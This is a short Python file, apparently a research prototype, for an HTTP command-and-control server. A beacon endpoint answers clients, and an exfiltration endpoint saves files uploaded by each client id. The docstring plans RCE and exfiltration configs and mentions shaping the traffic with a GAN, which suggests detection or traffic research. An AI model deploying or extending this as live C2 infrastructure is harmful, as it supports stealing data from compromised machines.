"""
This code is written on 5.2.2025 where use basic http.sever for communications.
The main important feature is that the connection goes over single TCP connection similar to other C2.
requirements:
1) config generator to define how long beacon, what RCE, RCE IAT, exfil, what to exfil, Exfil IAT
2) handle multiple clients each has it own config

****************Important************
if we wanna integrate the c2 to GAN it is hard to adopt the constraint of for example sending n number of packets from src2dst when using http 
Hence, decided to make it with websocket
"""
from fastapi import FastAPI, File, UploadFile, Query
from fastapi.responses import PlainTextResponse
from starlette.responses import StreamingResponse
import asyncio, aiofiles, os
app = FastAPI()


async def generate_chunks(number_of_chunks):
    for i in range(number_of_chunks):
        yield f"Chunk {i}\n".encode('utf-8')
        await asyncio.sleep(1)  # Simulate delay between chunks

@app.get("/beacon/")
async def beacon(client_id: str = Query(...)):
    """
    
    """
    #return StreamingResponse(generate_chunks(), headers={"Connection": "keep-alive"}) # sending response data in chunk chunk 
    #"""
    # only returns plain text responses ==> one packet for response
    return PlainTextResponse(
        f"idle client id: {client_id}",
        headers={"Connection": "keep-alive"}  # Ensure the server keeps the connection open
    )
    #"""
@app.post("/exfil_by_post/")
async def rce(client_id: str = Query(...),file: UploadFile=File(...)):
    upload_directory = "fastapi_http_c2/uploaded_files"
    #filename = os.path.basename(file.filename)
    file_path = os.path.join(upload_directory, f"{client_id}")
    try:
        async with aiofiles.open(file_path, 'wb') as out_file:
            content = await file.read()  # async read
            await out_file.write(content)  # async write
        print(f"client id {client_id}")
        response = {"filename": file.filename, "client_id": client_id}    
    except Exception as e:
        response = {"error": str(e)}
    return response  

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app, 
        host="0.0.0.0", 
        port=5000, 
        loop="asyncio", 
        http="httptools",  # Fix for persistent connections
        workers=1  # Avoid multi-worker issues
    )

